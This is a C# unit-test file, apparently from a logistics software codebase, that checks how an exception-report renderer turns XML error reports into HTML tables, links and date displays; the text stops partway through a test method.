using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;
using System.Xml.Linq;
using CargoWise.Bi.Common;
using CargoWise.Common;
using CargoWise.EntityFramework;
using CargoWise.EntityFramework.Testing;
using CargoWise.IO;
using Enterprise.MasterFiles.Business;
using Enterprise.ZArchitecture.Core;
using Enterprise.ZArchitecture.Environment;
using NUnit.Framework;

namespace Enterprise.Client.EDI.IssueManager.Business.Test
{
	// Important Note: This attribute will set the timezone offset to +2 hours for the duration of the test regardless your local timezone.
	[TestTimeZone]
	public class ExceptionReportRendererTest : TestCaseWithFactory
	{
		protected override void SetUp()
		{
			base.SetUp();
			GlbBranch.CurrentBranch.HomePort.TimeZoneSet.StandardZone.R2_OffsetMinutesFromUTC = 480;
		}

		public void TestCreateHtmlFile()
		{
			string xml = GetXmlForReport();
			AssertCreateHtmlFile(xml);
		}

		public void TestCreateHtmlFile_NameIsNull()
		{
			string xml = GetXmlForReport();

			xml = xml.Replace("<Name>UserContext</Name>", "");
			AssertNoExceptionThrown(() => AssertCreateHtmlFile(xml));
		}

		public void TestCreateHtmlFile_NoTrackedObjectsInfo_WhenLackingRequiredAttrs()
		{
			var input = GenerateCartesianProductInput("Enterprise.MasterFiles.Business.GlbStaff", "3");
			var combinations = CartesianProduct(input);
			combinations.Where(c => c.Contains(null) || c.Contains(string.Empty))
				.ForEach(c =>
				{
					var content = string.Empty;
					if (c.ElementAt(0) != null)
					{
						content += @$"<Type>{c.ElementAt(0)}</Type>";
					}

					if (c.ElementAt(1) != null)
					{
						content += $@"<Count>{c.ElementAt(1)}</Count>";
					}

					var errReportXml = @$"<EDI_Exception_Report>
  <ErrorReportID>Test Error Id</ErrorReportID>
  <Subject>Exception Report (Test Error Id) in Unknown from Eagle Datamation International - Baibhav.sukla</Subject>
  <Key>Test Key add line no</Key>
  <LoginName>CWSupport</LoginName>
  <DBServerName>SYDCO-WBSK-V1D</DBServerName>
  <MachineName>SYDCO-WBSK-V1D</MachineName>
  <MachineLocalUserName>Baibhav.sukla</MachineLocalUserName>
  <UsersEmailAddress />
  <Company>Eagle Datamation International</Company>
  <CommandLine>""C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\IDE\Extensions\TestPlatform\Extensions\..//testhost.net48.x86.exe""  --port 55080 --endpoint 127.0.0.1:055080 --role client --parentprocessid 20380 --telemetryoptedin true</CommandLine>
  <ExceptionDescription>Test Error add line no</ExceptionDescription>
  <FactoryDebugInfo>
    <FactoryStatistics>
      <FactoryStatistic>
        <Name>Client side Cache</Name>
        <ThreadID>15</ThreadID>
        <ActiveFetchHintsCount>0</ActiveFetchHintsCount>
        <BusinessObjectCount>0</BusinessObjectCount>
        <ChildFactoriesCount>0</ChildFactoriesCount>
        <DatabaseLoadCount>7</DatabaseLoadCount>
        <DataRowCount>5</DataRowCount>
        <FactoryInstance>22</FactoryInstance>
        <FactoryCreationTime>02-Mar-22 18:11:43</FactoryCreationTime>
        <AllocationPath>Suppressed for performance</AllocationPath>
        <TrackedInstances>
          <Bizo>
{content}
          </Bizo>
        </TrackedInstances>
      </FactoryStatistic>
    </FactoryStatistics>
  </FactoryDebugInfo>
</EDI_Exception_Report>";

					AssertTextTranslation(errReportXml, "SampleFactoryStatisticsWithLackingRequiredAttrs.htm");
				});
		}

		public void TestCreateHtmlFile_DisplayAdvancedInfoNoLink_WhenRequiredAttrAndAdditionalAttrsExists()
		{
			var input = GenerateCartesianProductInput("MyParameter", "MyAdvanceInfo");
			var combinations = CartesianProduct(input);

			combinations.ForEach(c =>
			{
				var attrContent = "Assembly=\"A.dll\" Type=\"MyType\" Method=\"MyMethod\" ILOffset=\"MyILOffset\" ";
				if (c.ElementAt(0) != null)
				{
					attrContent += $"Parameters=\"{c.ElementAt(0)}\" ";
				}
				if (c.ElementAt(1) != null)
				{
					attrContent += $"AdvanceInfo=\"{c.ElementAt(1)}\" ";
				}
				var errReportXml = $@"<EDI_Exception_Report>
  <TimeOfException>2019-08-05T15:47:29.2485198Z</TimeOfException>
  <ErrorReportID>R163401320077571294</ErrorReportID>
  <VersionNumber>MyVersionNumber</VersionNumber>
  <ExceptionDetails>
    <ExceptionType>java.lang.RuntimeException</ExceptionType>
    <Message>Unable to start activity ComponentInfo{{com.wisetechglobal.glowclient/com.wisetechglobal.glowclient.FullscreenWebActivity}}</Message>
    <Source>CargoWise One (Glow) Android Client</Source>
    <StackTrace>
      <Calls>11</Calls>
      <Call>java.lang.UnsupportedOperationException: Url not configured</Call>
      <Call {attrContent}>   at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2666)</Call>
      <Call>   at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2727)</Call>
      <Call>   at android.app.ActivityThread.-wrap12(ActivityThread.java)</Call>
      <Call>   at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1478)</Call>
      <Call>   at android.os.Handler.dispatchMessage(Handler.java:102)</Call>
      <Call>   at android.os.Looper.loop(Looper.java:154)</Call>
      <Call>   at andoird.app.ActivityThread.main(ActivityThread.java:6123)</Call>
      <Call>   at java.lang.reflect.Method.invoke(Native Method)</Call>
      <Call>   at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:889)</Call>
      <Call>   at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:779)</Call>
    </StackTrace>
  </ExceptionDetails>
  <ExceptionMessage>Unable to start activity ComponentInfo{{com.wisetechglobal.glowclient/com.wisetechglobal.glowclient.FullscreenWebActivity}}</ExceptionMessage>
</EDI_Exception_Report>";

				var report = new ExceptionReport(errReportXml);
				var renderer = new ExceptionReportRenderer(report);
				using var actualPath = renderer.CreateHtmlFile();
				var actual = File.ReadAllText(actualPath.Filename);
				AssertEquals("html should have advanced line no link", true, actual.Contains("<a Name=advancedLineNoHyperLink"));

				if (c.ElementAt(0) != null)
				{
					AssertEquals("advance line no link should have Parameters attribute", true, actual.Contains($"Parameters={c.ElementAt(0)}"));
				}
				if (c.ElementAt(1) != null)
				{
					AssertEquals("advance line no link should have AdvanceInfo attribute", true, actual.Contains($"AdvanceInfo={c.ElementAt(1)}"));
				}
			});
		}

		public void TestCreateHtmlFile_NoAdvancedInfoNoLink_WhenLackingRequireAttrs()
		{
			var input = GenerateCartesianProductInput("A.dll", "MyType", "MyMethod", "MyILOffset", "MyVersion");
			var combinations = CartesianProduct(input);
			combinations.Where(c => c.Contains(null) || c.Contains(string.Empty))
				.ForEach(c =>
				{
					var attrContent = string.Empty;
					var versionContent = string.Empty;
					if (c.ElementAt(0) != null)
					{
						attrContent += $"Assembly=\"{c.ElementAt(0)}\" ";
					}

					if (c.ElementAt(1) != null)
					{
						attrContent += $"Type=\"{c.ElementAt(1)}\" ";
					}

					if (c.ElementAt(2) != null)
					{
						attrContent += $"Method=\"{c.ElementAt(2)}\" ";
					}

					if (c.ElementAt(3) != null)
					{
						attrContent += $"ILOffset=\"{c.ElementAt(3)}\" ";
					}

					if (c.ElementAt(4) != null)
					{
						versionContent += $"<VersionNumber>{c.ElementAt(4)}</VersionNumber>";
					}

					var errReportXml = $@"<EDI_Exception_Report>
  <TimeOfException>2019-08-05T15:47:29.2485198Z</TimeOfException>
  <ErrorReportID>R163401320077571294</ErrorReportID>
{versionContent}
  <ExceptionDetails>
    <ExceptionType>java.lang.RuntimeException</ExceptionType>
    <Message>Unable to start activity ComponentInfo{{com.wisetechglobal.glowclient/com.wisetechglobal.glowclient.FullscreenWebActivity}}</Message>
    <Source>CargoWise One (Glow) Android Client</Source>
    <StackTrace>
      <Calls>11</Calls>
      <Call>java.lang.UnsupportedOperationException: Url not configured</Call>
      <Call {attrContent}>   at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2666)</Call>
      <Call>   at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2727)</Call>
      <Call>   at android.app.ActivityThread.-wrap12(ActivityThread.java)</Call>
      <Call>   at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1478)</Call>
      <Call>   at android.os.Handler.dispatchMessage(Handler.java:102)</Call>
      <Call>   at android.os.Looper.loop(Looper.java:154)</Call>
      <Call>   at andoird.app.ActivityThread.main(ActivityThread.java:6123)</Call>
      <Call>   at java.lang.reflect.Method.invoke(Native Method)</Call>
      <Call>   at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:889)</Call>
      <Call>   at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:779)</Call>
    </StackTrace>
  </ExceptionDetails>
  <ExceptionMessage>Unable to start activity ComponentInfo{{com.wisetechglobal.glowclient/com.wisetechglobal.glowclient.FullscreenWebActivity}}</ExceptionMessage>
</EDI_Exception_Report>";
					var report = new ExceptionReport(errReportXml);
					var renderer = new ExceptionReportRenderer(report);
					using var actualPath = renderer.CreateHtmlFile();
					var actual = File.ReadAllText(actualPath.Filename);
					AssertEquals($"html shouldn't have advanced line no link for attribute content: {attrContent}", false,
						actual.Contains("<a Name=advancedLineNoHyperLink"));
				});
		}

		public void TestCreateHtmlFile_DisplaySourceLineNoLink_WhenRequiredAttrsAreNotEmpty()
		{
			AssertTranslation("SampleStackTraceWithAllSourceLineNoLinkRequiredAttrs.xml", "SampleStackTraceWithAllSourceLineNoLinkRequiredAttrs.htm");
		}

		public void TestCreateHtmlFile_NoSourceLineNoLink_WhenLackingRequiredAttrs()
		{
			var input = GenerateCartesianProductInput("true", "android.app.ActivityThread.performLaunchActivity", "2262");
			var combinations = CartesianProduct(input);
			var combinationContents = combinations
				.Where(c => c.Contains(null) || c.Contains(string.Empty))
				.Select(c =>
					{
						var content = string.Empty;
						if (c.ElementAt(0) != null)
						{
							content += $"ApproxLine=\"{c.ElementAt(0)}\" ";
						}

						if (c.ElementAt(1) != null)
						{
							content += $"Source=\"{c.ElementAt(1)}\" ";
						}

						if (c.ElementAt(2) != null)
						{
							content += $"Line=\"{c.ElementAt(2)}\" ";
						}

						return content;
					})
				.ToList();
			foreach (var combinationContent in combinationContents)
			{
				var errReportXml = $@"<EDI_Exception_Report>
  <TimeOfException>2019-08-05T15:47:29.2485198Z</TimeOfException>
  <ErrorReportID>R163401320077571294</ErrorReportID>
  <ExceptionDetails>
    <ExceptionType>java.lang.RuntimeException</ExceptionType>
    <Message>Unable to start activity ComponentInfo{{com.wisetechglobal.glowclient/com.wisetechglobal.glowclient.FullscreenWebActivity}}</Message>
    <Source>CargoWise One (Glow) Android Client</Source>
    <StackTrace>
      <Calls>11</Calls>
      <Call>java.lang.UnsupportedOperationException: Url not configured</Call>
      <Call {combinationContent}>   at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2666)</Call>
      <Call>   at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2727)</Call>
      <Call>   at android.app.ActivityThread.-wrap12(ActivityThread.java)</Call>
      <Call>   at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1478)</Call>
      <Call>   at android.os.Handler.dispatchMessage(Handler.java:102)</Call>
      <Call>   at android.os.Looper.loop(Looper.java:154)</Call>
      <Call>   at andoird.app.ActivityThread.main(ActivityThread.java:6123)</Call>
      <Call>   at java.lang.reflect.Method.invoke(Native Method)</Call>
      <Call>   at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:889)</Call>
      <Call>   at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:779)</Call>
    </StackTrace>
  </ExceptionDetails>
  <ExceptionMessage>Unable to start activity ComponentInfo{{com.wisetechglobal.glowclient/com.wisetechglobal.glowclient.FullscreenWebActivity}}</ExceptionMessage>
</EDI_Exception_Report>";

				AssertTextTranslation(errReportXml, "SampleStackTraceWithLackingSourceLineNoLinkRequiredAttrs.htm");
			}
		}

		public void TestCreateHtmlFile_AllKindsOfDateFormat()
		{
			var dateArr = new[]
			{
				"2024-10-08T09:11:06.1234567Z", "2024-10-08T17:11:06.1234567+8", "08-Oct-24 11:11:06", "2024-10-08 11:11:06",
			};
			var errorReportXmlTemplate = @"
<EDI_Exception_Report>
	<MachineName>SYD-WYSM-1</MachineName>
	<MachineLocalUserName>GlowPortals</MachineLocalUserName>
	<ErrorReportID>R169826131529397283</ErrorReportID>
	<TimeOfException>{0}</TimeOfException>
	<VersionNumber>1.4.3729.9</VersionNumber>
	<ExeCreationTime>{1}</ExeCreationTime>
	<Subject>Error report from UNKNOWN</Subject>
	<ExceptionDetails>
		<Message>A promise was rejected and not handled. Rejection reason: abc</Message>
		<Source>CargoWise One (Glow) Web Client</Source>
		<ExceptionType>ProxiedJavascriptException</ExceptionType>
		<StackTrace />
	</ExceptionDetails>
	<Source>CargoWise One (Glow) Web Client</Source>
	<ExceptionMessage>A promise was rejected and not handled. Rejection reason: abc</ExceptionMessage>
	<ExceptionDescription>A promise was rejected and not handled. Rejection reason: abc</ExceptionDescription>
</EDI_Exception_Report>";

			foreach (var exceptionDate in dateArr)
			{
				foreach (var exeDate in dateArr)
				{
					var errorReportXml = string.Format(errorReportXmlTemplate, exceptionDate, exeDate);
					AssertTextTranslation(errorReportXml, "SampleHTMLDifferentDateFormat.htm");
				}
			}
		}

		static void AssertTextTranslation(string errReportXml, string expectedFileName)
		{
			var expected = GetSampleFileContents(expectedFileName);

			var report = new ExceptionReport(errReportXml);
			var renderer = new ExceptionReportRenderer(report);
			using var actualPath = renderer.CreateHtmlFile();
			var actual = File.ReadAllText(actualPath.Filename);
			AssertMultilineASCIIEquals(expected, actual);
		}

		static IEnumerable<IEnumerable<string>> GenerateCartesianProductInput(params string[] elements)
		{
			return elements.Select(e => new List<string> { null, string.Empty, e }).ToList();
		}

		static IEnumerable<IEnumerable<T>> CartesianProduct<T>(IEnumerable<IEnumerable<T>> sequences)
		{
			IEnumerable<IEnumerable<T>> emptyProduct = new[] { Enumerable.Empty<T>() };
			return sequences.Aggregate(
				emptyProduct,
				(accumulator, sequence) =>
					from accseq in accumulator
					from item in sequence
					select accseq.Concat(new[] { item }));
		}

		public void TestExceptionReportWithNulls()
		{
			var report = new ExceptionReport("<XSSTEST>\0</XSSTEST>");
			var renderer = new ExceptionReportRenderer(report);
			AssertNoExceptionThrown(() =>
			{
				using (var tempFile = renderer.CreateHtmlFile())
				{
					// Assert that the tempFile has expected content
					string htmlText = File.ReadAllText(tempFile.Filename);

					Assert(!renderer.Failed);
					AssertContains("Summary", htmlText);
				}
			});
		}

		public void TestAddNewColumnForFactoryInstance()
		{
			string xml = GetXmlForReport();
			XmlDocument xmlDoc = new XmlDocument();
			xmlDoc.LoadXml(xml);
			var instanceNodes = xmlDoc.SelectNodes("EDI_Exception_Report/FactoryDebugInfo/FactoryStatistics/FactoryStatistic/FactoryInstance");
			var instancesToFind = new List<string>();
			foreach (XmlNode node in instanceNodes)
			{
				var newInstanceValue = "FactoryInctance_" + node.InnerText;
				node.InnerText = newInstanceValue;
				instancesToFind.Add(newInstanceValue);
			}

			ExceptionReport report = new ExceptionReport(xmlDoc.InnerXml);
			ExceptionReportRenderer renderer = new ExceptionReportRenderer(report);
			using (TempFile tempFile = renderer.CreateHtmlFile())
			{
				string htmlText = File.ReadAllText(tempFile.Filename);
				htmlText = htmlText.Replace("\r", "").Replace("\n", "").Replace("\t", "");

				Assert(!renderer.Failed);
				Assert(File.Exists(tempFile.Filename));

				var headerCell = "<td><b>Factory Instance</b></td>";
				var headerPos = htmlText.IndexOf(headerCell);
				Assert("Column header", headerPos > 0);
				var valueTableEndPos = htmlText.IndexOf("</table></td></tr></table>", headerPos);

				foreach (var instanceValue in instancesToFind)
				{
					var valueCell = $"<td>{instanceValue}</td>";
					var valuePos = htmlText.IndexOf(valueCell, headerPos);
					Assert("Value cell", valuePos > 0 && valuePos < valueTableEndPos);
				}
			}
		}

		public void TestCreateHtmlFile_NoStackTrace()
		{
			string xml = GetXmlForReport();

			const string stackTraceOpenTag = "<StackTrace>";
			int startOfStackTraceNode = xml.IndexOf(stackTraceOpenTag);
			xml = xml.Remove(startOfStackTraceNode, xml.IndexOf("</StackTrace>") - startOfStackTraceNode + stackTraceOpenTag.Length);
			AssertCreateHtmlFile(xml);
		}

		public void TestNoOtherSelfCloseTagsExceptBreakNewLineTag()
		{
			var xml = GetSampleFileContents("SampleXMLFactoryStatistics.xml");
			var report = new ExceptionReport(xml);
			var renderer = new ExceptionReportRenderer(report);
			var xmlDoc = new XmlDocument();
			xmlDoc.LoadXml(xml);

			using var tempFile = renderer.CreateHtmlFile();
			var htmlText = File.ReadAllText(tempFile.Filename);

			var openTagRegex = @"<(\w+)[^>]*>";
			var closeTagRegex = @"</(\w+)[^>]*>";

			var openTagSet = TagExtract(openTagRegex);
			var closeTagSet = TagExtract(closeTagRegex);

			openTagSet.ExceptWith(closeTagSet);
			openTagSet.ExceptWith(ExceptionReportRenderer.SelfCloseTags);

			Assert("There are other self close tags in generated html, please update ExceptionReportRenderer.SelfCloseTags property", openTagSet.IsNullOrEmpty());

			HashSet<string> TagExtract(string regex)
			{
				var openTagCollections = Regex.Matches(htmlText, regex);
				var openTags = openTagCollections.Cast<Match>().Select(m => m.Groups[1].Value).ToHashSet();
				return openTags;
			}
		}

		public void TestFactoryStatisticsGroupByNameAndAllocationPath()
		{
			string xml = GetSampleFileContents("SampleXMLFactoryStatistics.xml");
			ExceptionReport report = new ExceptionReport(xml);
			ExceptionReportRenderer renderer = new ExceptionReportRenderer(report);
			XmlDocument xmlDoc = new XmlDocument();
			xmlDoc.LoadXml(xml);

			TempFile tempFile = renderer.CreateHtmlFile();
			string htmlText = File.ReadAllText(tempFile.Filename);
			tempFile.Dispose();

			var factoryStatisticsName = "Client side Cache";
			var factoryStatisticsCreationStack = "Suppressed for performance";
			var expectedFactoryStatisticsHtml =
				@"<table><tr>	<td><b>Name</b></td>	<td><b>Creation Stack</b></td>	<td><b>Factory Statistics Count</b></td>	<td><b>Details</b></td></tr>
<tr>
	<td>Client side Cache</td>
	<td>Suppressed for performance</td>
	<td>2</td>
	<td><table><tr>	<td><b>Creation Thread ID</b></td>	<td><b>Active Fetch Hints</b></td>	<td><b>Business Objects</b></td>	<td><b>Child Factories</b></td>	<td><b>Child Factory IDs</b></td>	<td><b>Database Loads</b></td>	<td><b>Data Rows</b></td>	<td><b>Factory Instance</b></td>	<td><b>Creation Time</b></td>	<td><b>Tracked Objects</b></td></tr><tr>	<td>15</td>	<td>0</td>	<td>0</td>	<td>0</td>	<td></td>	<td>7</td>	<td>5</td>	<td>22</td>	<td>02-Mar-22 18:11:43</td>	<td></td></tr><tr>	<td>15</td>	<td>0</td>	<td>0</td>	<td>0</td>	<td></td>	<td>0</td>	<td>0</td>	<td>23</td>	<td>02-Mar-22 18:11:43</td>	<td></td></tr></table></td>
</tr>
</table>";

			AssertEquals("Name should not be repeated", 1, Regex.Matches(htmlText, Regex.Escape(factoryStatisticsName)).Count);
			AssertEquals("Creation stack should not be repeated", 1, Regex.Matches(htmlText, Regex.Escape(factoryStatisticsCreationStack)).Count);
			AssertContains("Should contain Factory statistics html", expectedFactoryStatisticsHtml, htmlText);
		}

		public void TestFactoriesSeparateProperlyWhenIncludeWithOtherFactoriesIsFalse()
		{
			string xml = GetSampleFileContents("SampleXMLFactoryStatisticsSeparateSomeFactories.xml");
			var report = new ExceptionReport(xml);
			var renderer = new ExceptionReportRenderer(report);
			var xmlDoc = new XmlDocument();
			xmlDoc.LoadXml(xml);

			TempFile tempFile = renderer.CreateHtmlFile();
			string htmlText = File.ReadAllText(tempFile.Filename);
			tempFile.Dispose();
			var expectedNormalFactoryStatisticsHtml =
				@"<table><tr>	<td><b>Name</b></td>	<td><b>Creation Stack</b></td>	<td><b>Factory Statistics Count</b></td>	<td><b>Details</b></td></tr>
<tr>
	<td>Client side Cache</td>
	<td>Suppressed for performance</td>
	<td>1</td>
	<td><table><tr>	<td><b>Creation Thread ID</b></td>	<td><b>Active Fetch Hints</b></td>	<td><b>Business Objects</b></td>	<td><b>Child Factories</b></td>	<td><b>Child Factory IDs</b></td>	<td><b>Database Loads</b></td>	<td><b>Data Rows</b></td>	<td><b>Factory Instance</b></td>	<td><b>Creation Time</b></td>	<td><b>Tracked Objects</b></td></tr><tr>	<td>15</td>	<td>0</td>	<td>0</td>	<td>0</td>	<td></td>	<td>7</td>	<td>5</td>	<td>22</td>	<td>02-Mar-22 18:11:43</td>	<td></td></tr></table></td>
</tr>
</table>";
			var expectedOtherFactoryStatisticsHtml =
	@"<table><tr>	<td><b>Name</b></td>	<td><b>Creation Stack</b></td>	<td><b>Factory Statistics Count</b></td>	<td><b>Details</b></td></tr>
<tr>
	<td>Dummy Unrelated Factory</td>
	<td>Suppressed for performance</td>
	<td>1</td>
	<td><table><tr>	<td><b>Creation Thread ID</b></td>	<td><b>Active Fetch Hints</b></td>	<td><b>Business Objects</b></td>	<td><b>Child Factories</b></td>	<td><b>Child Factory IDs</b></td>	<td><b>Database Loads</b></td>	<td><b>Data Rows</b></td>	<td><b>Factory Instance</b></td>	<td><b>Creation Time</b></td>	<td><b>Tracked Objects</b></td></tr><tr>	<td>15</td>	<td>0</td>	<td>0</td>	<td>0</td>	<td></td>	<td>0</td>	<td>0</td>	<td>23</td>	<td>02-Mar-22 18:11:43</td>	<td></td></tr></table></td>
</tr>
</table>";
			AssertContains("Should contain regular factory statistics", expectedNormalFactoryStatisticsHtml, htmlText);
			AssertContains("Should contain other factory statistics", expectedOtherFactoryStatisticsHtml, htmlText);
		}

		public void TestFactoryStatisticsNullCheck()
		{
			string xml = GetSampleFileContents("SampleXMLFactoryStatisticsSeparateSomeFactories.xml");
			var renderer = new ExceptionReportRenderer(new ExceptionReport(xml));
			var xmlDoc = new XmlDocument();
			xmlDoc.LoadXml(xml);
			using (var tempFile = renderer.CreateHtmlFile())
			{
				string htmlText = File.ReadAllText(tempFile.Filename);
				AssertContains("Should contain factory statistics", "Factory Statistics Count", htmlText);
			}

			var xml2 = xml.Replace("<FactoryStatistics>", "<f001>")
				.Replace("</FactoryStatistics>", "</f001>")
				.Replace("<OtherFactoryStatistics>", "<f002>")
				.Replace("</OtherFactoryStatistics>", "</f002>");
			var renderer2 = new ExceptionReportRenderer(new ExceptionReport(xml2));
			var xmlDoc2 = new XmlDocument();
			xmlDoc2.LoadXml(xml2);
			using (var tempFile = renderer2.CreateHtmlFile())
			{
				string htmlText = File.ReadAllText(tempFile.Filename);
				AssertNotContains("Should not contain factory statistics", "Factory Statistics Count", htmlText);
			}
		}

		public void TestCorruptDllVersionSection()
		{
			AssertCreateHtmlFile(testXmlWithCorruptDllVersionSection);
		}

		public void TestSample()
		{
			AssertTranslation("SampleXML.xml", "SampleHTML.htm");
		}

		public void TestSampleOld()
		{
			AssertTranslation("SampleOldXML.xml", "SampleOldHTML.htm");
		}

		public void TestSampleLargeCommand()
		{
			AssertTranslation("SampleXMLLargeCommand.xml", "SampleHTMLLargeCommand.htm");
		}

		public void TestAppleCrashReport()
		{
			AssertTranslation("SampleAppleCrashXML.xml", "SampleAppleCrashHTML.htm");
		}

		public void TestSampleWithEmptyStackTraceElement()
		{
			AssertTranslation("SampleXMLEmptyStackTrace.xml", "SampleHTMLEmptyOrMissingStackTrace.htm");
		}

		public void TestSampleWithMissingStackTraceElement()
		{
			AssertTranslation("SampleXMLMissingStackTrace.xml", "SampleHTMLEmptyOrMissingStackTrace.htm");
		}

		public void TestSampleWithDevice()
		{
			AssertTranslation("SampleWithDevice.xml", "SampleWithDevice.htm");
		}

		public void TestSampleWithRelatedLogs()
		{
			AssertTranslation("SampleWithRelatedLogs.xml", "SampleWithRelatedLogs.htm");
		}

		public void TestSampleWithProcessIDAndHttpRequestDetails()
		{
			AssertTranslation("SampleWithProcessAndHttp.xml", "SampleWithProcessAndHttp.htm");
		}

		public void TestSampleWithAggregateExceptionWithInnerExceptions()
		{
			AssertTranslation("SampleWithAggregateException.xml", "SampleWithAggregateException.htm");
		}

		public void TestWindows10WorkstationReportsRawQuickInfo()
			=> AssertWindowsOperatingSystemDisplayVersion("Windows 10 Enterprise", "10.0.19043", "Client", "Windows 10 Enterprise");

		public void TestWindowsServer2022ReportsRawQuickInfo()
			=> AssertWindowsOperatingSystemDisplayVersion("Windows Server 2022", "10.0.22000", "Server", "Windows Server 2022");

		public void TestWindowsServer2022CoreReportsRawQuickInfo()
			=> AssertWindowsOperatingSystemDisplayVersion("Windows Server 2022", "10.0.22000", "Server Core", "Windows Server 2022");

		public void TestWindowsUnknownInstalltionTypeReportsRawQuickInfo()
			=> AssertWindowsOperatingSystemDisplayVersion("Windows Foo Bar", "10.0.22000", "JunkValue", "Windows Foo Bar");

		public void TestHypotheticalFutureWindowsVersionReportsRawQuickInfo()
			=> AssertWindowsOperatingSystemDisplayVersion("Windows Bar Baz", "10.1.1234", "Client", "Windows Bar Baz");

		public void TestWindowsWithGarbageVersionReportsRawQuickInfo()
			=> AssertWindowsOperatingSystemDisplayVersion("Windows Bar Quux", "N0t.A.V3rs10n", "Client", "Windows Bar Quux");

		public void TestWindows11WorkstationReportsRealOperatingSystemName()
			=> AssertWindowsOperatingSystemDisplayVersion("Windows 10 Enterprise", "10.0.22000", "Client", "Windows 11 (reported as: 'Windows 10 Enterprise')");

		void AssertWindowsOperatingSystemDisplayVersion(string quickInfo, string version, string installationType, string expectedText)
		{
			var xml = GetXmlForReport();
			var xmlDoc = new XmlDocument();
			xmlDoc.LoadXml(xml);
			var operatingSystemInfo = xmlDoc.SelectSingleNode("//OSInfo");
			Set("OSQuickInfo", quickInfo);
			Set("OSType", "Win32NT");
			Set("OSVersion", version);
			Set("InstallationType", installationType);

			var modifiedXmlText = new StringWriter();
			using (var writer = XmlWriter.Create(modifiedXmlText))
			{
				xmlDoc.WriteTo(writer);
				writer.Flush();
			}

			var report = new ExceptionReport(modifiedXmlText.ToString());
			var renderer = new ExceptionReportRenderer(report);

			var tableHtml = new StringBuilder();
			var foundContent = false;
			using (var tempFile = renderer.CreateHtmlFile())
			using (var fs = File.OpenRead(tempFile.Filename))
			using (var reader = new StreamReader(fs))
			{
				string line;
				while ((line = reader.ReadLine()) != null)
				{
					if (!foundContent && line.IndexOf("<h2>OSInfo</h2>", StringComparison.Ordinal) < 0)
					{
						// We found the start of our table.
						continue;
					}

					if (line.IndexOf("<h2>", StringComparison.Ordinal) >= 0)
					{
						if (!foundContent)
						{
							// Start of our section, skip the header line.
							foundContent = true;
							continue;
						}

						// Start of next section, time to bail.
						break;
					}

					// Otherwise, we found the good stuff!
					tableHtml.AppendLine(line);
				}
			}

			AssertGreaterThan("Should have read out the OSInfo table.", tableHtml.Length, 0);
			var document = XDocument.Parse(tableHtml.ToString());
			AssertEquals("Should have parsed the OSInfo table.", "table", document.Root.Name.LocalName);

			// Build up the full dictionary so that this is as bit easier to debug, even though we are only interested
			// in one particular child element.
			var osInfo = document.Root.Elements("tr").Select(row =>
			{
				var cells = row.Elements("td").ToList();
				AssertEquals("<tr> should have two <td> children.", 2, cells.Count);
				var key = cells[0].Value;
				var value = cells[1].Value;
				return new KeyValuePair<string, string>(key, value);
			}).ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

			AssertEquals(expectedText, osInfo["OSQuickInfo"]);

			void Set(string key, string value)
			{
				var element = operatingSystemInfo[key];
				if (element is null)
				{
					element = xmlDoc.CreateElement(key);
					operatingSystemInfo.AppendChild(element);
				}
				element.InnerText = value;
			}
		}

		public static string GetSampleFileContents(string fileName)
		{
			var sampleFilesPrefix = "ZClientEDI.Business.Test.IssueManager.SampleFiles.";
			var resourceRetriever = new EmbeddedResourceRetriever(typeof(ExceptionReportRendererTest).Assembly);
			return resourceRetriever.GetString(sampleFilesPrefix + fileName);
		}

		public void TestProcessLineNoNotAffectExisingXML()
		{
			string xml = GetSampleFileContents("SampleXML.xml");
			ExceptionReport report = new ExceptionReport(xml);
			ExceptionReportRenderer renderer = new ExceptionReportRenderer(report);
			XmlDocument xmlDoc = new XmlDocument();
			xmlDoc.LoadXml(xml);

			Assert(ExceptionReportRenderer.GetLineNoInfoState(xmlDoc.DocumentElement["ExceptionDetails"]) == ExceptionReportRenderer.LineNoInfoState.NO_LINENO_INFO);

			TempFile tempFile = renderer.CreateHtmlFile();
			string htmlText = File.ReadAllText(tempFile.Filename);
			tempFile.Dispose();

			Assert(!htmlText.Contains(" line numbers"));
		}

		public void TestCreateHtmlFileByteOrderMarkExists()
		{
			ExceptionReport report = new ExceptionReport("<EDI_Exception_Report><Company>ABC Company</Company></EDI_Exception_Report>");
			ExceptionReportRenderer renderer = new ExceptionReportRenderer(report);
			using (TempFile result = renderer.CreateHtmlFile())
			{
				Assert(File.Exists(result.Filename));

				UTF8Encoding utf8Encoding = new UTF8Encoding(true);
				AssertEquals("Unicode (UTF-8)", utf8Encoding.EncodingName);
				byte[] utf8Preamble = utf8Encoding.GetPreamble();

				byte[] elementsFromFileStream = new byte[utf8Preamble.Length];
				using (var fileStream = File.OpenRead(result.Filename))
				{
					fileStream.Read(elementsFromFileStream, 0, elementsFromFileStream.Length);
				}

				AssertArrayEqualsByElements(utf8Preamble, elementsFromFileStream);
			}
		}

		public void TestComplementaryData()
		{
			var exception = GenerateExceptionObject();
			var keyUnic = new Guid();
			exception.Data.Add(keyUnic, "This is not a string.");

			var secondKeyUnic = "ThisIsAnUnicKey";
			exception.Data.Add(secondKeyUnic, "Hulk Smash.");

			var details = new ExceptionDetails(exception);
			var builder = new ExceptionReportBuilder(new ExceptionReportArgs(exception, "", "", ""));

			var xml = builder.GenerateReport();
			var report = new ExceptionReport(xml);
			var renderer = new ExceptionReportRenderer(report);

			using (var tempFile = renderer.CreateHtmlFile())
			{
				var expected = "00000000-0000-0000-0000-000000000000: This is not a string.<br>ThisIsAnUnicKey: Hulk Smash";
				var actual = File.ReadAllText(tempFile.Filename);
